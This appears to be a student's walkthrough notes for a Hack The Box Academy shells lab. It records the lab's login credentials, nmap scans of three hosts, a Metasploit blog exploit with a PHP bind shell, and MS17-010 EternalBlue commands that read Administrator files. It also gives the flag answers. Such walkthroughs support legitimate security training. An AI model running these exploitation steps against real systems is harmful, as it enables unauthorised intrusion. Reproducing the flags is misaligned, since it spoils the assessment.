Foothold:
10.129.204.126

Host1: 
172.16.1.11:8080

Host2:
blog.inlaefreight.local

Host3: 
172.16.1.13


##What is the hostname of Host-1? (Format: all lower case)
##RDP to 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD), with user "htb-student" and password "HTB_@cademy_stdnt!" 
        SHELLS-WINSVR
        
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap 172.16.1.11 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-03 23:58 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.038s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-04T03:59:53+00:00
|_ssl-date: 2026-06-04T03:59:58+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2026-06-03T03:29:54
|_Not valid after:  2026-12-03T03:29:54
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: **SHELLS-WINSVR**, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:c2:6b:26 (unknown)
| smb2-time: 
|   date: 2026-06-04T03:59:52
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-03T20:59:53-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s


##Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
Host1: 
172.16.1.11:8080

─[✗]─[htb-student@skills-foothold]─[~]
└──╼ $nmap 172.16.1.11 -sC -sV
Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-08 13:03 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.038s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-08T17:04:50+00:00
|_ssl-date: 2026-06-08T17:04:55+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2026-06-07T16:56:43
|_Not valid after:  2026-12-07T16:56:43
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tofiremcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:64:5a:1f (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-08T10:04:50-07:00
|_clock-skew: mean: 1h24m04s, deviation: 3h07m50s, median: 3s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-06-08T17:04:50
|_  start_date: N/A

inet 172.16.1.5/23

        dev-share



##What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
Host2:
blog.inlaefreight.local

─[htb-student@skills-foothold]─[~]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -oN host2_initial_enum -sC -sV 172.16.1.12
Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-08 13:53 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.72 seconds
        ubuntu

##What language is the shell written in that gets uploaded when using the 50064.rb exploit?
        msfconsole use 50064.rb > options 
        Payload options (php/meterpreter/bind_tcp)
        php

##Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
        
        msf6 exploit(50064) > options

Module options (exploit/50064):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   demo             yes       Blog password
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identi
                                         fier, or hosts file with syntax 'file
                                         :<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       The URI of the arkei gate
   USERNAME   demo             yes       Blog username
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   PHP payload


msf6 exploit(50064) > set rhost 172.16.1.12
rhost => 172.16.1.12
msf6 exploit(50064) > set username admin
username => admin
msf6 exploit(50064) > set password admin123!@#
password => admin123!@#
msf6 exploit(50064) > set vhost blog.inlanefreight.local
vhost => blog.inlanefreight.local
msf6 exploit(50064) > run
meterpreter > shell
Process 1476 created.
Channel 0 created.
cat /customscripts/flag.txt
        B1nD_Shells_r_cool


##What is the hostname of Host-3?
Host3: 
172.16.1.13

┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -oN host3_initial_enum 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-08 15:59 EDT
Nmap scan report for 172.16.1.13
Host is up (0.023s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -oN host1_services_enum -sC -sV -p 80,135,139,445 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-08 16:00 EDT
Nmap scan report for 172.16.1.13
Host is up (0.0017s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m04s, deviation: 4h02m29s, median: 4s
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:bb:d0:ad (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: **SHELLS-WINBLUE\x00**
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-08T13:00:29-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-08T20:00:29
|_  start_date: 2026-06-08T19:48:47
        SHELLS-WINBLUE\x00


##Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 2
msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 172.16.1.13
rhost => 172.16.1.13
msf6 auxiliary(admin/smb/ms17_010_command) > set rport 445
rport => 445
msf6 auxiliary(admin/smb/ms17_010_command) > set command type "C:\Users\Administrator\Desktop\Skills-flag.txt"
command => type C:\Users\Administrator\Desktop\Skills-flag.txt
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 172.16.1.13:445       - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445       - Built a write-what-where primitive...
[+] 172.16.1.13:445       - Overwrite complete... SYSTEM session obtained!
[+] 172.16.1.13:445       - Service start timed out, OK if running a command or non-service executable...
[*] 172.16.1.13:445       - Getting the command output...
[*] 172.16.1.13:445       - Executing cleanup...
[+] 172.16.1.13:445       - Cleanup was successful
[+] 172.16.1.13:445       - Command completed successfully!
[*] 172.16.1.13:445       - Output for "type C:\Users\Administrator\Desktop\Skills-flag.txt":

One-H0st-Down!

[*] 172.16.1.13:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/ms17_010_command) > 











